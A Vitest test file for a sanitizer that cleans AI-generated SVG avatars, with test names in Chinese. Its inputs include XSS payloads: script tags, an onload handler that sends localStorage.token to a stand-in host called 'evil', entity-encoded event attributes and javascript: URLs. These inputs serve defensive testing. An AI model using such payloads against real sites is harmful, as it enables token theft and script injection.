import { describe, it, expect } from "vitest";
import { sanitizeAgentSvg } from "./avatar.js";

import { generateAvatarSvg } from "./avatar.js";

describe("sanitizeAgentSvg", () => {
  it("保留合法线稿", () => {
    const input = `<g stroke-width="2" stroke-linecap="round"><rect x="3" y="8" width="18" height="10" rx="3"/><path d="M7 13h3"/><circle cx="15" cy="12" r="1"/></g>`;
    const out = sanitizeAgentSvg(input);
    expect(out).toContain("<rect");
    expect(out).toContain('d="M7 13h3"');
    expect(out).toContain("<circle");
  });
  it("剥掉 <script>", () => {
    expect(sanitizeAgentSvg(`<g><script>alert(1)</script><path d="M1 1"/></g>`)).not.toContain("script");
  });
  it("剥掉 on* 事件属性", () => {
    const out = sanitizeAgentSvg(`<g><circle cx="1" cy="1" r="1" onload="fetch('//evil/'+localStorage.token)"/></g>`);
    expect(out).not.toMatch(/onload/i);
    expect(out).toContain("<circle");
  });
  it("剥掉大小写混淆的事件属性", () => {
    expect(sanitizeAgentSvg(`<g><path d="M1 1" OnLoad="x()" ONCLICK="y()"/></g>`)).not.toMatch(/on(load|click)/i);
  });
  it("剥掉 entity 编码绕过的事件属性", () => {
    expect(sanitizeAgentSvg(`<g><path d="M1 1" &#111;nload="x()"/></g>`)).not.toMatch(/onload/i);
  });
  it("剥掉外层注入的 <svg onload>", () => {
    const out = sanitizeAgentSvg(`<svg onload="alert(1)"><g><path d="M1 1"/></g></svg>`);
    expect(out).not.toMatch(/onload/i);
    expect(out).not.toContain("<svg");
    expect(out).toContain('d="M1 1"');
  });
  it("剥掉 xlink:href / href", () => {
    const out = sanitizeAgentSvg(`<g><a xlink:href="javascript:alert(1)"><path d="M1 1"/></a></g>`);
    expect(out).not.toMatch(/href/i);
    expect(out).not.toMatch(/javascript/i);
  });
  it("剥掉 foreignObject 与其内容", () => {
    const out = sanitizeAgentSvg(`<g><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject><path d="M1 1"/></g>`);
    expect(out).not.toMatch(/foreignObject|iframe/i);
    expect(out).toContain('d="M1 1"');
  });
  it("剥掉 <use>", () => {
    expect(sanitizeAgentSvg(`<g><use href="#x"/><path d="M1 1"/></g>`)).not.toContain("<use");
  });
  it("剥掉 style 属性与 <style> 标签", () => {
    const out = sanitizeAgentSvg(`<g><style>*{x:y}</style><path d="M1 1" style="background:url(javascript:alert(1))"/></g>`);
    expect(out).not.toMatch(/style/i);
    expect(out).not.toMatch(/javascript/i);
  });
  it("剥掉 fill / stroke 颜色（颜色由前端给）", () => {
    const out = sanitizeAgentSvg(`<g fill="#ff0000" stroke="red"><path d="M1 1" fill="blue"/></g>`);
    expect(out).not.toMatch(/fill="/);
    expect(out).not.toMatch(/stroke="/);
    expect(out).toContain("<path");
  });
  it("嵌套超过 8 层 → null", () => {
    const deep = "<g>".repeat(9) + '<path d="M1 1"/>' + "</g>".repeat(9);
    expect(sanitizeAgentSvg(deep)).toBeNull();
  });
  it("单个 d 超过 2KB → null", () => {
    expect(sanitizeAgentSvg(`<g><path d="${"M1 1 ".repeat(500)}"/></g>`)).toBeNull();
  });
  it("总体积超过 8KB → null", () => {
    expect(sanitizeAgentSvg(`<g>${'<circle cx="1" cy="1" r="1"/>'.repeat(400)}</g>`)).toBeNull();
  });
  it("节点数超过 60 → null", () => {
    expect(sanitizeAgentSvg(`<g>${'<circle cx="1" cy="1" r="1"/>'.repeat(61)}</g>`)).toBeNull();
  });
  it("全部被剥空 → null", () => {
    expect(sanitizeAgentSvg(`<g><script>x</script></g>`)).toBeNull();
  });
  it("非法输入 → null", () => {
    expect(sanitizeAgentSvg("not xml at all")).toBeNull();
    expect(sanitizeAgentSvg("")).toBeNull();
  });
  it("深层嵌套的非法标签也受深度上限约束 → null", () => {
    // 9 层非法标签嵌套，最内层才是合法 path
    const deep = "<a>".repeat(9) + '<path d="M1 1"/>' + "</a>".repeat(9);
    expect(sanitizeAgentSvg(deep)).toBeNull();
  });
});

const fakeClient = (text: string) => ({
  messages: { create: async () => ({ content: [{ type: "text", text }] }) },
}) as never;

describe("generateAvatarSvg", () => {
  it("净化模型输出并返回线稿", async () => {
    const raw = "```xml\n<g stroke-width=\"2\"><path d=\"M4 4h16\"/></g>\n```";
    const out = await generateAvatarSvg(fakeClient(raw), "m", "法务顾问", "合同审查");
    expect(out).toContain('d="M4 4h16"');
  });
  it("模型抛错 → null，不抛异常", async () => {
    const bad = { messages: { create: async () => { throw new Error("502"); } } } as never;
    await expect(generateAvatarSvg(bad, "m", "x", "y")).resolves.toBeNull();
  });
  it("模型输出全是垃圾 → null", async () => {
    await expect(generateAvatarSvg(fakeClient("我不会画"), "m", "x", "y")).resolves.toBeNull();
  });
});
